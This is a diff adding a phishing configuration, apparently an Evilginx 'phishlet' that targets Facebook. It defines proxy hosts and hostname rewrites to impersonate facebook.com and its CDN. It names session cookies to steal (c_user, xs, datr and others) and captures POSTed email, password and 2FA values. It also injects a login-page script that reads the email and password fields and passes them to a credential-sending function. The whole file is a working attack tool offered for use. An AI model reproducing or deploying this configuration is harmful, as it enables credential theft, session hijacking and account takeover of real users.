@@ -1,0 +1,94 @@
+name: 'Facebook Phishlet'
+author: 'LxKh4n1yn-Kali-Linux'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true }
+  - { phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false }
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false }
+  - { phish_sub: 'scontent', orig_sub: 'scontent', domain: 'xx.fbcdn.net', session: false, is_landing: false }
+  - { phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false, is_landing: false }
+  - { phish_sub: 'pixel', orig_sub: 'pixel', domain: 'facebook.com', session: false, is_landing: false }
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false, is_landing: false }
+
+sub_filters:
+  - triggers_on: 'www.facebook.com'
+    orig_sub: 'www'
+    domain: 'facebook.com'
+    search: 'www.facebook.com'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/javascript', 'text/css', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*', 'application/x-www-form-urlencoded']
+  - triggers_on: 'm.facebook.com'
+    orig_sub: 'm'
+    domain: 'facebook.com'
+    search: 'm.facebook.com'
+    replace: 'm.{hostname}'
+    mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/javascript', 'text/css', 'image/x-icon', 'text/plain', 'application/x-www-form-urlencoded']
+  - triggers_on: 'static.xx.fbcdn.net'
+    orig_sub: 'static'
+    domain: 'xx.fbcdn.net'
+    search: 'static.xx.fbcdn.net'
+    replace: 'static.{hostname}'
+    mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/javascript', 'text/css', 'image/*']
+  - triggers_on: 'scontent.xx.fbcdn.net'
+    orig_sub: 'scontent'
+    domain: 'xx.fbcdn.net'
+    search: 'scontent.xx.fbcdn.net'
+    replace: 'scontent.{hostname}'
+    mimes: ['text/html', 'application/json', 'text/javascript', 'image/*']
+  - triggers_on: 'api.facebook.com'
+    orig_sub: 'api'
+    domain: 'facebook.com'
+    search: 'api.facebook.com'
+    replace: 'api.{hostname}'
+    mimes: ['application/json', 'text/javascript']
+
+auth_tokens:
+  - domain: 'facebook.com'
+    keys: ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'spin', 'presence']
+
+credentials:
+  username:
+    key: 'email'
+    search: '.*'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '.*'
+    type: 'post'
+  custom:
+    key: '2fa'
+    search: '.*'
+    type: 'post'
+
+auth_urls:
+  - "https://{hostname}/login/device-based/regular/login"
+  - "https://{hostname}/login.php"
+  - "https://{hostname}/login/save-device"
+  - "https://{hostname}/login/checkpoint"
+
+login:
+  domain: 'www.facebook.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["facebook.com"]
+    trigger_paths: ["/login", "/login.php", "/checkpoint"]
+    trigger_params: ["*"]
+    script: |
+      function onclickListener() {
+        var email = document.getElementsByName("email")[0].value;
+        var pass = document.getElementsByName("pass")[0].value;
+        if (email != "" && pass != "") {
+          sendCredentials(email, pass);
+        }
+      }
+      document.querySelectorAll('button[type="submit"]').forEach(function(el) {
+        el.addEventListener('click', onclickListener);
+      });
+
+headers:
+  - { path: '*', key: 'X-Frame-Options', value: 'SAMEORIGIN' }
+  - { path: '*', key: 'X-Content-Type-Options', value: 'nosniff' }
+  - { path: '*', key: 'X-XSS-Protection', value: '1; mode=block' }
+  - { path: '*', key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }
